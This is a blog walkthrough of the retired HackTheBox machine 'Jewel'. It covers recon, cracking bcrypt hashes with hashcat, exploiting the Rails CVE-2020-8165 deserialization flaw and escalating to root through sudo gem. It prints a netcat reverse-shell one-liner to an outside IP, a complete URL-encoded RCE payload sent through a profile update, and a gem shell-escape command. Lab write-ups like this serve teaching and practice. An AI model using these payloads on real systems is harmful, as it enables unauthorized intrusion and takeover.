@@ -1,0 +1,210 @@
+---
+layout: walkthrough
+title: HackTheBox - Jewel
+date: 2021-02-14 12:00:00 +0200
+img: ChallengeVMs/HTB_Icons/jewel.png # Add image post (optional)
+status: Retired
+description: Hi all, My name is Kyhle Öhlinger and this blog post forms part of my personal blog. If you enjoy any of the posts, feel free to reach out and let me know :) 
+---
+
+Hi everyone, today we are going to be looking at Jewel --`10.10.10.211`-- from HackTheBox. The image below provides a high-level overview of the topics covered during this walkthrough:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/Overview.png"  style="width: 65%" />
+</p>
+
+## Information Gathering
+
+In order to start the VM, we start with the Information gathering phase. Let's begin with a Nmap Scan.
+
+### Nmap Output
+
+<details>
+
+```bat
+vagrant@ko:~/Desktop/HackTheBox/Jewel$ nmap -sC -sV 10.10.10.211
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-09 09:25 EST
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
+Nmap done: 1 IP address (0 hosts up) scanned in 3.30 seconds
+vagrant@ko:~/Desktop/HackTheBox/Jewel$ nmap -sC -sV 10.10.10.211 -Pn
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-09 09:25 EST
+Nmap scan report for 10.10.10.211
+Host is up (0.18s latency).
+Not shown: 997 filtered ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
+|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
+|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
+8000/tcp open  http    Apache httpd 2.4.38
+|_http-generator: gitweb/2.20.1 git/2.20.1
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Apache/2.4.38 (Debian)
+| http-title: 10.10.10.211 Git
+|_Requested resource was http://10.10.10.211:8000/gitweb/
+8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
+|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
+|_http-title: BL0G!
+Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 33.03 seconds
+
+```
+
+</details>
+
+From the output shown above, we can see that the machine is a Linux machine and I added `jewel.htb` to the `/etc/hosts` file. As this is a Linux machine, I looked into the nmap information and saw `gitweb/2.20.1` on port 8000 which seemed interesting. 
+
+### Investigating GitWeb
+
+The resource that I requested was <http://10.10.10.211:8000/gitweb/> -- browsing over to it, I can see a number of useful files including `bd.sql`:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img1.png"  style="width: 75%" />
+</p>
+
+After opening the sql database file, I found potential hashes for two users:
+
+* bill@mail.htb -- `$2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW`
+* jennifer@mail.htb -- `$2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy`
+ 
+I saved these hashes and used hashcat to attempt to crack the passwords, since the hashes were in the bcrypt format, it resulted in mode 3200:
+
+ > The prefix "$2a$" or "$2b$" (or "$2y$") in a hash string in a shadow password file indicates that hash string is a bcrypt hash in modular crypt format.
+ 
+The fields that I added were:
+* `-m 3200`: designates the type of hash we are cracking 
+* `-a 0`: designates a dictionary attack
+* `-o cracked.txt`: is the output file for the cracked passwords
+* `hashes.txt`: is our input file of hashes
+* `/usr/share/wordlists/rockyou.txt`: is the absolute path to the wordlist file for this dictionary attack
+
+So putting it all together resulted in the following command:
+
+```bat
+hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
+
+While this was cracking, I decided to keep digging. The `Gemfile` contained a ton of useful information including:
+* ruby '2.5.5'
+* gem 'rails', '= 5.2.2.1' 
+ 
+While looking into potential vulnerabilities for these versions, I came across the following Github page: <https://github.com/masahiro331/CVE-2020-8165>. 
+ 
+ > A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.
+
+Since I knew that it would be possible to exploit either `MemCacheStore` or `RedisCacheStore` which includes the `:raw` parameter, I started looking into the various files on gitweb. From the `application.controller.rb` under `app/controllers` I found the following:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img2.png"  style="width: 70%" />
+</p>
+
+ 
+Alright, now I knew where I needed to look &rarr; user update, specifically the username parameter. Looking into the exploit, the only exploitation code was part of the curl command:
+ 
+```bat
+curl 'localhost:3000/users?new=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T'
+```
+
+Looking into the command, the code execution portion specifically created a new file in the `tmp` directory, and I wanted to exploit that. In order to create a reverse shell, it would be as simple as changing the command from `touch /tmp/rce` to the following reverse shell payload:
+
+```bat
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.87 9001
+```
+
+The resulting exploit is as follows:
+
+```bat
+%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22U%60rm+%2Ftmp%2Ff%3Bmkfifo%20%2ftmp%2ff%3bcat%20%2ftmp%2ff%7c%2fbin%2fsh+-i+2%3e%261%7cnc+10.10.14.87+9001+%3e%2Ftmp%2ff%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
+``` 
+ 
+After registering an account on the application and logging in to the blog, I navigated to the profile page and attempted to update the username field with the new payload:
+
+<details>
+
+```bat
+POST /users/18 HTTP/1.1
+Host: 10.10.10.211:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.211:8080/users/18/edit
+
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 195
+Connection: close
+Cookie: _session_id=f56d6b786752dd3d3dd042722ed72767
+Upgrade-Insecure-Requests: 1
+
+utf8=%E2%9C%93&_method=patch&authenticity_token=DAYZaJ%2FIL4G4JuGAHtbb03I9XwcfTltEXkmOVnMBo%2BSD8HOH5BZABSBTpeyQ1qIrbTcCX%2FMLC%2B6mXfdGECaN4Q%3D%3D&user%5Busername%5D=hotshoto&commit=Update+User
+```
+
+</details>
+
+However, instead of the username being `hotshoto`, I replaced it with the payload above. Running the exploit and returning to the home page provided me with a reverse shell:
+ 
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img3.png"  style="width: 70%" />
+</p>
+
+## Lateral Movement using Bill
+
+After uploading LinPEAS to the server, I came across `/var/backups` which contained hashes. Within the file I found 2 hashes:
+
+* jennifer@mail.htb -- `$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO`
+* bill@mail.htb -- `$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW`
+
+Thinking back to the start of the machine, this seemed similar to the previous passwords I found in the gitweb repository so I added them to the same `hashes.txt` file and ran the following command:
+
+```bat
+hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
+```
+ 
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img4.png"  style="width: 70%" />
+</p>
+
+Seems like there is an additional step to this process. I browsed the home directory for Bill and came across `.google_authenticator` which contained the following information:
+ 
+<details>
+
+```bat
+bill@jewel:~$ cat .google_authenticator
+2UQI3R52WFCLE6JTLDCSJYMJH4
+" WINDOW_SIZE 17
+" TOTP_AUTH
+
+```
+
+</details>
+
+Since I knew that it was a TOTP string, I used the FireFox add-on for 2FA: <https://addons.mozilla.org/en-US/firefox/addon/auth-helper/>. After adding the secret to the authenticator application. I was able to retrieve a code, however, when attempting to use the code during authentication, I was presented with the following:
+   
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img5.png"  style="width: 70%" />
+</p>
+
+Due to it being a Google authenticator prompt which works on time, I needed to adjust my local machines time to match the server. Following this, I was able to authenticate as shown below:
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img6.png"  style="width: 70%" />
+</p>
+
+## Privilege Escalation using Gem
+
+After determining that Bill could exploit gem using the sudo command, I had a look at GTFO bins to see if the package had an easy exploit: <https://gtfobins.github.io/gtfobins/gem/>. I made use of the following command in order to exploit the host and gain access to the root user:
+
+```bat
+gem open -e "/bin/sh -c /bin/sh" rdoc
+```
+
+
+<p class="imgMiddle">
+<img src="/assets/img/ChallengeVMs/Jewel/img7.png"  style="width: 70%" />
+</p>
+ 
+That's the box! I hope that the walkthrough helped someone. If you found it interesting at all or if you think it was missing some crucial information, please reach out to me so that I can continue improving as I create more posts.
